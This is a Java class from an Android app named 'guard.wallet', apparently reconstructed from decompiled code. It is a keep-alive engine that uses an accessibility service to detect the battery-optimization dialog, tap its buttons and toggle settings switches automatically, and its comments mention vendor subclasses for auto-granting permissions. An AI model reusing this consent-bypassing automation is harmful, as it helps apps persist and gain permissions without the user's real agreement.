package com.guard.wallet.engine;
import com.guard.wallet.core.AppUtils;
import com.guard.wallet.delegate.AccessibilityDelegate;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * vendor o/c — 所有厂商保活引擎的基类 (KeepAliveEngine)。
 *
 * 继承 AccessibilityDelegate 基类。
 * 提供: 保活调度、任务队列管理、引擎生命周期、
 * 电池优化对话框处理、CompoundButton/Switch/CheckBox 切换辅助。
 *
 * 子类: n (华为), v (OPPO), g (AOSP), q (小米), e0 (传音),
 *       i0 (vivo), g0 (OPPO 权限), h0 (权限自动授予)。
 *
 * 字段:
 *   n — 任务队列 (ConcurrentLinkedQueue) 异步操作
 *   o — 可重入锁，线程安全
 *   p — 调度执行器，周期任务
 *   q — 运行标志 (AtomicBoolean)
 *
 * ADAPT: 字段 'a' (from AccessibilityDelegate) 和 'o','n','p','q' (from KeepAliveEngine)
 * 可能与包名冲突。所有对 a.a.* 和 o.b.* 的引用已内联处理。
 */
public abstract class KeepAliveEngine extends AccessibilityDelegate {

    /** 保活操作任务队列（如 "keepInBatteryUnRestricted"） */
    public final ConcurrentLinkedQueue n = new ConcurrentLinkedQueue();

    /** 线程安全引擎操作的可重入锁 */
    public final ReentrantLock o = new ReentrantLock();

    /** 单线程调度执行器，周期保活任务 */
    public final ScheduledExecutorService p = Executors.newSingleThreadScheduledExecutor();

    /** 引擎终止标志: true 表示引擎已完成/已标记为终止 */
    public final AtomicBoolean q = new AtomicBoolean(false);

    // ═══════ 内联辅助方法 (a.a.c / a.a.b / o.b.r / o.b.q) ═══════
    // ADAPT: 因字段 'a' (String) 继承自 AccessibilityDelegate 和字段 'o' (ReentrantLock)
    // 会遮蔽包 'a' 和 'o'，静态方法中也无法直接引用。全部内联如下。

    /**
     * 内联 a.a.c(filter, prop, eq): 初始化 stringConditions，创建条件。
     */
    private static StringCondition initFilterCondition(CombineFilter f, String prop, String eq) {
        f.setStringConditions(new LinkedList<>());
        StringCondition sc = new StringCondition();
        sc.setProperty(prop);
        sc.setEquals(eq);
        return sc;
    }

    /**
     * 内联 a.a.b(filter, existingCond, prop, eq): 添加现有条件，创建新条件。
     */
    private static StringCondition chainFilterCondition(CombineFilter f, StringCondition existing, String prop, String eq) {
        f.getStringConditions().add(existing);
        StringCondition sc = new StringCondition();
        sc.setProperty(prop);
        sc.setEquals(eq);
        return sc;
    }

    /**
     * 内联 o.b.r(lw): 初始化 ListenWindow 的 eventTypes。
     */
    private static HashSet initEventTypes(ListenWindow lw) {
        lw.setEventTypes(new HashSet<>());
        return lw.getEventTypes();
    }

    /**
     * 内联 o.b.q(eventType, set, lw): 添加 eventType，返回 lw 的 eventTypes。
     */
    private static HashSet addEventType(int eventType, HashSet set, ListenWindow lw) {
        set.add(eventType);
        return lw.getEventTypes();
    }

    // ═══════ Constructor ═══════

    public KeepAliveEngine(LinkedList listenWindows, String targetPackage) {
        super(listenWindows, targetPackage);
    }

    // ═══════ 静态过滤器/UI 辅助方法 ═══════

    /**
     * vendor H() → buildTextContainsFilter() — 构建匹配包含指定文本的 TextView 的 CombineFilter。
     * 用于在设置 UI 中查找文本标签。
     */
    public static CombineFilter buildTextContainsFilter(String text) {
        CombineFilter filter = new CombineFilter();
        StringCondition condition = initFilterCondition(filter, "className", "android.widget.TextView");
        filter.getStringConditions().add(condition);
        condition = new StringCondition();
        condition.setProperty("text");
        condition.setContains(text);
        filter.getStringConditions().add(condition);
        return filter;
    }

    /**
     * vendor I() → buildBatteryDialogAllowFilter() — 构建电池对话框允许按钮的 CombineFiltersWithOr。
     * 匹配 "android:id/button1" 或 "com.android.settings:id/btn_positive"。
     */
    public static CombineFiltersWithOr buildBatteryDialogAllowFilter() {
        CombineFiltersWithOr orFilter = new CombineFiltersWithOr(new LinkedList<>());
        List filters = orFilter.getFilters();
        CombineFilter filter = new CombineFilter();
        StringCondition condition = chainFilterCondition(filter,
                initFilterCondition(filter, "className", "android.widget.Button"),
                "id", "android:id/button1");
        filter.getStringConditions().add(condition);
        filters.add(filter);
        filters = orFilter.getFilters();
        filter = new CombineFilter();
        condition = chainFilterCondition(filter,
                initFilterCondition(filter, "className", "android.widget.Button"),
                "id", "com.android.settings:id/btn_positive");
        filter.getStringConditions().add(condition);
        filters.add(filter);
        return orFilter;
    }

    /**
     * vendor J() → buildBatteryDialogListenWindow() — 构建设置电池优化对话框的 ListenWindow。
     * 包名: com.android.settings, 类名: android.app.Dialog,
     * eventTypes: 32 (VIEW_SCROLLED), 16384 (WINDOW_STATE_CHANGED)。
     */
    public static ListenWindow buildBatteryDialogListenWindow() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.app.Dialog");
        addEventType(32, initEventTypes(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    /**
     * vendor K() → buildClickableLinearLayoutFilter() — 构建可点击 LinearLayout 的 CombineFilter。
     * 用于在设置中查找可点击的列表项。
     */
    public static CombineFilter buildClickableLinearLayoutFilter() {
        CombineFilter filter = new CombineFilter();
        StringCondition condition = initFilterCondition(filter, "className", "android.widget.LinearLayout");
        filter.getStringConditions().add(condition);
        filter.setBoolConditions(new LinkedList<>());
        filter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        return filter;
    }

    /**
     * vendor L() → buildClickableNodeFilter() — 构建任意可点击节点的 CombineFilter。
     * 当直接切换点击失败时用作父节点回退搜索。
     */
    public static CombineFilter buildClickableNodeFilter() {
        CombineFilter filter = new CombineFilter();
        filter.setBoolConditions(new LinkedList<>());
        BoolCondition condition = new BoolCondition("clickable", true, true);
        filter.getBoolConditions().add(condition);
        return filter;
    }

    /**
     * vendor M() → dismissBatteryDialog() — 若存在则关闭电池优化对话框。
     * 检查当前窗口是否为 "android.app.Dialog"（通过 rootInActiveWindow 或缓存的 className），
     * 然后点击取消按钮（buildDialogCancelButtonFilter 过滤器）。
     */
    public static void dismissBatteryDialog() {
        if (MyAccessibilityService.P() == null) {
            return;
        }
        AtomicReference windowClassRef = MyAccessibilityService.v2;
        if (!Objects.equals((String) windowClassRef.get(), "android.app.Dialog")) {
            MyAccessibilityService service = MyAccessibilityService.P();
            service.getClass();
            String currentClass;
            try {
                AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
                if (rootNode != null && rootNode.getClassName() != null) {
                    currentClass = rootNode.getClassName().toString();
                } else {
                    currentClass = (String) windowClassRef.get();
                }
            } catch (Exception ex) {
                AppUtils.s("MyAccessibilityService", ex);
                currentClass = null;
            }
            if (!Objects.equals(currentClass, "android.app.Dialog")) {
                return;
            }
        }
        MyAccessibilityService svc = MyAccessibilityService.P();
        CombineFilter cancelFilter = buildDialogCancelButtonFilter();
        svc.getClass();
        UiObject cancelButton = MyAccessibilityService.M(cancelFilter);
        if (cancelButton != null && cancelButton.click()) {
            Log.d("o.c", "已点击对话框取消按钮");
            com.guard.wallet.utils.SystemHelper.T0(5);
        }
    }

    /**
     * vendor N() → buildDialogCancelButtonFilter() — 构建对话框取消按钮的 CombineFilter ("android:id/button1")。
     */
    public static CombineFilter buildDialogCancelButtonFilter() {
        CombineFilter filter = new CombineFilter();
        StringCondition condition = chainFilterCondition(filter,
                initFilterCondition(filter, "className", "android.widget.Button"),
                "id", "android:id/button1");
        filter.getStringConditions().add(condition);
        return filter;
    }

    /**
     * vendor P() → toggleCompoundButton() — 查找并切换 CompoundButton 为选中状态。
     *
     * 向上搜索最多 2 层父节点查找 CompoundButton。
     * 若未选中: 点击，等待最多 5 次重试。
     * 若直接点击失败: 尝试点击父级可点击节点作为回退。
     *
     * @return CheckedResult 包含最终选中状态和是否执行了点击
     */
    public static CheckedResult toggleCompoundButton(UiObject startNode) {
        CheckedResult result = new CheckedResult();
        boolean checked = false;
        try {
            // Build filter for CompoundButton
            CombineFilter filter = new CombineFilter();
            LinkedList conditions = new LinkedList();
            filter.setStringConditions(conditions);
            StringCondition condition = new StringCondition();
            condition.setProperty("className");
            condition.setEquals("android.widget.CompoundButton");
            filter.getStringConditions().add(condition);

            // Refresh accessibility cache
            MyAccessibilityService.I(startNode);

            // Search up to 2 parent levels for CompoundButton
            UiObject toggleNode = null;
            int depth = 0;
            UiObject current = startNode;
            while (current != null && toggleNode == null && depth <= 2) {
                toggleNode = current.findOneByCombine(filter);
                current = current.parent();
                depth++;
            }

            if (toggleNode == null) {
                result.setChecked(false);
                return result;
            }

            checked = toggleNode.checked();
            int retries = 5;

            // Strategy 1: direct click on toggle
            if (!checked) {
                if (toggleNode.click()) {
                    result.setClicked(true);
                    toggleNode.refresh();
                    checked = toggleNode.checked();
                    while (retries > 0 && !checked) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        toggleNode.refresh();
                        checked = toggleNode.checked();
                        retries--;
                    }
                }
            }

            // Strategy 2: click parent clickable node as fallback
            if (!checked) {
                UiObject clickableParent = toggleNode.findParentUtilCombine(buildClickableNodeFilter());
                if (clickableParent != null && clickableParent.click()) {
                    result.setClicked(true);
                    toggleNode.refresh();
                    checked = toggleNode.checked();
                    while (retries > 0 && !checked) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        toggleNode.refresh();
                        checked = toggleNode.checked();
                        retries--;
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s("o.c", ex);
        }
        result.setChecked(checked);
        return result;
    }

    /**
     * vendor S() → toggleSwitchByGesture() — 查找 Switch 并通过手势点击切换。
     *
     * 向上搜索最多 2 层父节点查找 Switch 控件。
     * 若未选中: 在 (right-80, centerY) 执行手势点击。
     *
     * @return CheckedResult 包含最终选中状态和是否执行了点击
     */
    public static CheckedResult toggleSwitchByGesture(UiObject startNode) {
        CheckedResult result = new CheckedResult();
        try {
            CombineFilter filter = buildSwitchFilter();
            MyAccessibilityService.I(startNode);

            // Search up to 2 parent levels for Switch
            int depth = 0;
            UiObject switchNode = null;
            while (startNode != null && switchNode == null && depth <= 2) {
                switchNode = startNode.findOneByCombine(filter);
                UiObject next = startNode;
                if (switchNode == null) {
                    next = startNode.parent();
                }
                depth++;
                startNode = next;
            }

            if (switchNode == null) {
                return result;
            }

            result.setChecked(switchNode.checked());
            int tapX = switchNode.boundsInScreen().right - 80;
            int tapY = (int) switchNode.centerInScreen().getY();
            if (!result.isChecked() && com.guard.wallet.utils.SystemHelper.s(tapX, tapY)) {
                com.guard.wallet.utils.SystemHelper.T0(5);
                result.setClicked(true);
            }

            return result;
        } catch (Exception ex) {
            AppUtils.s("o.c", ex);
        }
        return result;
    }

    /**
     * vendor U() → buildLinearLayoutFilter() — 构建 LinearLayout 的 CombineFilter（无可点击约束）。
     * 用于在设置中查找列表容器。
     */
    public static CombineFilter buildLinearLayoutFilter() {
        CombineFilter filter = new CombineFilter();
        StringCondition condition = initFilterCondition(filter, "className", "android.widget.LinearLayout");
        filter.getStringConditions().add(condition);
        return filter;
    }

    /**
     * vendor V() → buildScrollableContainerFilter() — 构建可滚动容器的 CombineFiltersWithOr。
     * 匹配: RecyclerView, ListView, ScrollView, 或任意可滚动节点。
     * 用于查找可滚动父节点以进行滚动查找操作。
     */
    public static CombineFiltersWithOr buildScrollableContainerFilter() {
        CombineFiltersWithOr orFilter = new CombineFiltersWithOr();
        orFilter.setFilters(new LinkedList<>());

        // RecyclerView + scrollable
        List filters = orFilter.getFilters();
        CombineFilter recyclerFilter = new CombineFilter();
        recyclerFilter.setStringConditions(new LinkedList<>());
        recyclerFilter.setBoolConditions(new LinkedList<>());
        StringCondition condition = new StringCondition();
        condition.setProperty("className");
        condition.setEquals("androidx.recyclerview.widget.RecyclerView");
        recyclerFilter.getStringConditions().add(condition);
        recyclerFilter.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters.add(recyclerFilter);

        // ListView + scrollable
        filters = orFilter.getFilters();
        CombineFilter listViewFilter = new CombineFilter();
        listViewFilter.setStringConditions(new LinkedList<>());
        listViewFilter.setBoolConditions(new LinkedList<>());
        condition = new StringCondition();
        condition.setProperty("className");
        condition.setEquals("android.widget.ListView");
        listViewFilter.getStringConditions().add(condition);
        listViewFilter.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters.add(listViewFilter);

        // ScrollView + scrollable
        filters = orFilter.getFilters();
        CombineFilter scrollViewFilter = new CombineFilter();
        scrollViewFilter.setStringConditions(new LinkedList<>());
        scrollViewFilter.setBoolConditions(new LinkedList<>());
        condition = new StringCondition();
        condition.setProperty("className");
        condition.setEquals("android.widget.ScrollView");
        scrollViewFilter.getStringConditions().add(condition);
        scrollViewFilter.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters.add(scrollViewFilter);

        // Any scrollable node (catch-all)
        filters = orFilter.getFilters();
        CombineFilter catchAllFilter = new CombineFilter();
        catchAllFilter.setBoolConditions(new LinkedList<>());
        BoolCondition scrollableCondition = new BoolCondition("scrollable", true, true);
        catchAllFilter.getBoolConditions().add(scrollableCondition);
        filters.add(catchAllFilter);

        return orFilter;
    }

    /**
     * vendor W() → notifyPrepareConfirmLock() — 通知策略引擎准备应用确认锁。
     * 发送 "PREPARE_FOR_APP_CONFIRM_LOCK" 事件到 MainApplication。
     */
    public static void notifyPrepareConfirmLock() {
        if (MainApplication.getInstance() != null) {
            MainApplication.getInstance().offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
        }
    }

    /**
     * vendor Y() → dismissDialogAndRequestBatteryExemption() — 关闭对话框并请求电池优化豁免。
     * 调用 dismissBatteryDialog() 关闭对话框，然后检查电池优化状态。
     * 若尚未豁免且无障碍已启用，请求豁免。
     *
     * @return true 若电池豁免请求已发起
     */
    public static boolean dismissDialogAndRequestBatteryExemption() {
        try {
            dismissBatteryDialog();
            if (!com.guard.wallet.utils.SystemHelper.o0() && AppUtils.A()) {
                com.guard.wallet.utils.SystemHelper.j0();
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.c", ex);
        }
        return false;
    }

    /**
     * vendor a0() → buildSwitchFilter() — 构建 Switch 控件的 CombineFilter。
     * 用于在设置页面查找切换开关。
     */
    public static CombineFilter buildSwitchFilter() {
        CombineFilter filter = new CombineFilter();
        StringCondition condition = initFilterCondition(filter, "className", "android.widget.Switch");
        filter.getStringConditions().add(condition);
        return filter;
    }

    // ═══════ Instance methods ═══════

    /**
     * vendor O() → toggleSwitchOrCheckBox() — 查找并切换 Switch/CheckBox 为选中状态。
     *
     * 通过 OR 过滤器向上搜索最多 2 层父节点查找 Switch 或 CheckBox。
     * 若未选中: 最多点击 5 次，重试间隔 5 tick。
     * 注意: maxRetries 参数（重试次数）未使用 — 始终使用内部 5 次循环。
     *
     * @return CheckedResult 包含最终选中状态和是否执行了点击
     */
    public final CheckedResult toggleSwitchOrCheckBox(UiObject startNode, int maxRetries) {
        CheckedResult result = new CheckedResult();
        boolean checked = false;
        try {
            // Build OR filter: Switch | CheckBox
            CombineFiltersWithOr orFilter = new CombineFiltersWithOr();
            orFilter.setFilters(new LinkedList<>());
            orFilter.getFilters().add(buildSwitchFilter());

            CombineFilter checkBoxFilter = new CombineFilter();
            checkBoxFilter.setStringConditions(new LinkedList<>());
            StringCondition condition = new StringCondition();
            condition.setProperty("className");
            condition.setEquals("android.widget.CheckBox");
            checkBoxFilter.getStringConditions().add(condition);
            orFilter.getFilters().add(checkBoxFilter);

            // Refresh accessibility cache
            MyAccessibilityService.I(startNode);

            // Search up to 2 parent levels for Switch/CheckBox
            UiObject checkboxNode = null;
            for (int depth = 0; startNode != null && checkboxNode == null && depth <= 2; depth++) {
                checkboxNode = startNode.findOneByOperateOr(orFilter);
                startNode = startNode.parent();
            }

            if (checkboxNode == null) {
                result.setChecked(false);
                return result;
            }

            Log.d("o.c", "checkboxNode is not null");
            checked = checkboxNode.checked();

            // Click until checked, up to 5 attempts
            for (int attempt = 0; !checked && attempt < 5; attempt++) {
                checkboxNode.click();
                Log.d("o.c", "checkboxNode is click");
                result.setClicked(true);
                com.guard.wallet.utils.SystemHelper.T0(5);
                checkboxNode.refresh();
                checked = checkboxNode.checked();
            }
        } catch (Exception ex) {
            AppUtils.s("o.c", ex);
        }
        result.setChecked(checked);
        return result;
    }

    /**
     * vendor Q() → findScrollableContainer() — 在当前 activeRoot 中查找可滚动容器。
     * 使用 buildScrollableContainerFilter() 过滤器（RecyclerView/ListView/ScrollView/scrollable）。
     *
     * @return 可滚动 UiObject 或 null
     */
    public final UiObject findScrollableContainer() {
        try {
            CombineFiltersWithOr filter = buildScrollableContainerFilter();
            if (this.k() != null) {
                return this.k().findOneByOperateOr(filter);
            }
        } catch (Exception ex) {
            AppUtils.s("o.c", ex);
        }
        return null;
    }

    /**
     * vendor R() → toggleSwitchWithRetry() — 查找 Switch 并通过带重试的手势点击切换。
     *
     * 向上搜索最多 2 层父节点查找 Switch 控件。
     * 若未选中: 在 (right-50, centerY) 执行手势点击。
     * 若手势成功，带重试等待状态变化。
     * 若点击失败: 尝试点击父级可点击节点作为回退。
     *
     * @param startNode 搜索起始 UiObject
     * @param maxRetries 状态轮询最大重试次数
     * @return CheckedResult 包含最终选中状态和是否执行了点击/手势
     */
    public final CheckedResult toggleSwitchWithRetry(UiObject startNode, int maxRetries) {
        CheckedResult result = new CheckedResult();
        boolean checked = false;
        try {
            CombineFilter filter = buildSwitchFilter();
            MyAccessibilityService.I(startNode);

            // Search up to 2 parent levels for Switch
            UiObject switchNode = null;
            int depth = 0;
            UiObject parent = startNode;
            while (parent != null && switchNode == null && depth <= 2) {
                switchNode = parent.findOneByCombine(filter);
                UiObject next = parent;
                if (switchNode == null) {
                    next = parent.parent();
                }
                depth++;
                parent = next;
            }

            if (switchNode == null) {
                result.setChecked(false);
                return result;
            }

            checked = switchNode.checked();
            int tapX = switchNode.boundsInScreen().right - 50;
            int tapY = (int) switchNode.centerInScreen().getY();

            // Strategy 1: gesture tap on switch
            if (!checked) {
                if (com.guard.wallet.utils.SystemHelper.s(tapX, tapY)) {
                    result.setClicked(true);
                    MyAccessibilityService.I(this.k());
                    switchNode = parent.findOneByCombine(filter);
                    checked = switchNode.checked();
                    while (maxRetries > 0 && !checked) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        switchNode = parent.findOneByCombine(filter);
                        checked = switchNode.checked();
                        maxRetries--;
                    }
                }
            }

            // Strategy 2: click parent clickable node as fallback
            if (!checked) {
                UiObject clickableParent = switchNode.findParentUtilCombine(buildClickableNodeFilter());
                if (clickableParent != null && clickableParent.click()) {
                    result.setClicked(true);
                    switchNode.refresh();
                    checked = switchNode.checked();
                    while (maxRetries > 0 && !checked) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        switchNode.refresh();
                        checked = switchNode.checked();
                        maxRetries--;
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s("o.c", ex);
        }
        result.setChecked(checked);
        return result;
    }

    /**
     * vendor T() → isEngineFinished() — 检查引擎是否已完成（标记为终止）。
     *
     * @return true 若引擎已被标记为终止（markEngineRunning() 已调用）
     */
    public final boolean isEngineFinished() {
        return this.q.get();
    }

    /**
     * vendor X() → markEngineRunning() — 标记引擎为运行中。
     * 将运行标志设为 true。
     */
    public final void markEngineRunning() {
        this.q.set(true);
    }

    /**
     * vendor Z() — 抽象清理/关闭方法。
     * 子类重写以执行厂商特定保活清理。
     */
    public abstract void Z();

    /**
     * vendor d() — 销毁引擎并释放资源。
     * 关闭调度执行器、取消线程池任务、清空任务队列，
     * 然后调用 super.d() 进行基类清理。
     */
    @Override
    public final void d() {
        try {
            this.p.shutdownNow();
            com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
            this.n.clear();
            super.d();
        } catch (Exception ex) {
            AppUtils.s("o.c", ex);
        }
    }

    /**
     * vendor u(event, packageName, className) — 处理无障碍事件。
     *
     * 委托到 super.u() 进行标准事件处理，然后检查当前窗口
     * 是否为电池优化对话框（J 过滤器）。
     * 若匹配，将 "keepInBatteryUnRestricted" 任务加入线程池。
     * 该任务（AccessibilityDelegate.a with code=0）将点击允许/取消按钮。
     */
    @Override
    public void u(AccessibilityEvent event, String packageName, String className) {
        try {
            super.u(event, packageName, className);

            boolean inBatteryDialog = false;
            try {
                if (this.q(Collections.singletonList(buildBatteryDialogListenWindow()))) {
                    Log.d("o.c", "已进入是否允许忽略电池优化窗口");
                    inBatteryDialog = true;
                }
            } catch (Exception ex) {
                AppUtils.s("o.c", ex);
            }

            if (!inBatteryDialog) {
                return;
            }

            ConcurrentLinkedQueue taskQueue = this.n;
            if (!taskQueue.contains("keepInBatteryUnRestricted")) {
                taskQueue.add("keepInBatteryUnRestricted");
                AccessibilityDelegate.a batteryTask = new AccessibilityDelegate.a(this, 0);
                com.guard.wallet.thread.DelegateTaskLauncher.c(batteryTask, super.c);
            }
        } catch (Exception ex2) {
            AppUtils.s("o.c", ex2);
        }
    }
}
